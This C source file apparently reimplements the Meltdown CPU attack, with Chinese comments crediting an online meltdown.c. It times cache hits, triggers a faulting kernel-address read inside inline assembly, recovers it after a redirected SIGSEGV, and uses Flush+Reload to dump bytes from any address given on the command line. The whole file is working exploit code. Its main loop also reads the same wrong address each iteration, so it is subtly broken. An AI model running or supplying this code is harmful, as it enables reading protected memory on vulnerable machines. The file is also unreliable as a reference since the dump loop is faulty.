#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include <stdint.h>

#define pagesize 4096
#define probetime 1000

char probe_array[256 * pagesize];//试探数组，假设页大小为4KB
int cache_hit_time;
int cache_count[256];



int get_time(volatile char * addr){
    int32_t t1, t2, temp;
    temp = 0;
    t1 = __rdtscp(&temp);
    *addr;
    t2 = __rdtscp(&temp);
    return t2 - t1;
    
}
static void set_cache_hit_time(void){//确定cache命中阙值
                                     //本函数参考https://gitee.com/idea4good/meltdown/blob/master/meltdown.c
    int cached, uncached, i;
    const int ESTIMATE_CYCLES = 1000000;
    memset(probe_array, 1, sizeof(probe_array));
    
    for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
        cached += get_time(probe_array);
    
    for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
        _mm_clflush(probe_array);
        uncached += get_time(probe_array);
    }
    
    cached /= ESTIMATE_CYCLES;
    uncached /= ESTIMATE_CYCLES;
    cache_hit_time = cached * 2;
}
void flush_probe_array(){//将试探数组从cache中flush出去，
                         //以保证在执行trasient指令后只有要被攻击的地址的内容信息对应的试探数组的单元被载入到cache中
    int i;
    for(i = 0; i < 256; i++)
        _mm_clflush(&probe_array[i * pagesize]);
}
static void reload(void){//在trasient指令执行结束后，对试探数组进行遍历，找出访存时间最短的认为是要dump出的数据，
                         //并对相应的cache_hit统计量进行自增
    int i, time, page_index;
    volatile char *addr;
    for(i = 0; i < 256; i++){
        page_index = ((i * 167) + 13) & 255;
        addr = &probe_array[page_index * pagesize];
        time = get_time(addr);
        if(time <=  cache_hit_time)
            cache_count[page_index]++;
    }
}
static void acc_probe(){
    char buff[256];
    int fd = open("/proc/version", O_RDONLY);
    if(fd < 0){
        perror("An error happend when opening");
        return;
    }
    if(pread(fd, buff, sizeof(buff), 0) < 0)
        perror("pread");
    close(fd);
}

extern char stop_probe[];
static void probe(unsigned long addr){
    acc_probe();
    asm volatile(//以下汇编代码截取自https://gitee.com/idea4good/meltdown/blob/master/meltdown.c
                 "movzx (%[addr]), %%eax\n\t"    //制造异常: eax = *addr
                 "shl $12, %%rax\n\t"
                 "movzx (%[probe_array], %%rax, 1), %%rbx\n"
                 "stop_probe: \n\t"
                 "nop\n\t"
                 :
                 : [probe_array] "r" (probe_array),
                 [addr] "r" (addr)
                 : "rax", "rbx"
                 );
}
//接下来的三个函数用途是配置异常信号与CPU，均来自https://gitee.com/idea4good/meltdown/blob/master/meltdown.c
static void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop_probe;
}

static int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };
    
    return sigaction(SIGSEGV, &act, NULL);
}

static void pin_cpu0()
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

static int readbyte(unsigned long addr){//每dump出一个数据要将reload函数执行1000次，
                                        //并从cache_hit统计中找出hit次数最大认为是真正的结果
    int max_index = -1, max = -1;
    memset(cache_count, 0, sizeof(cache_count));
    for(int i = 0; i < probetime; i++){
        flush_probe_array();
        probe(addr);
        reload();
    }
    for(int i = 0; i < 256; i++){
        if(cache_count[i] && cache_count[i] > max){
            max = cache_count[i];
            max_index = i;
        }
    }
    return max_index;
}

int main(int argc, const char * argv[]) {
    unsigned long readaddr, readsize;
    sscanf(argv[1], "%lx", &readaddr);
    sscanf(argv[2], "%lx", &readsize);
    
    set_signal();
    pin_cpu0();
    set_cache_hit_time();
    int data;
    for(int i = 0; i < readsize; i++){
        data = readbyte(readaddr + readsize);
        if(data == -1)
            data = 0xff;
        printf("DUMP: %lx = %x(%c)\n", readaddr + i, data, isprint(data)? data : ' ');
    }
}
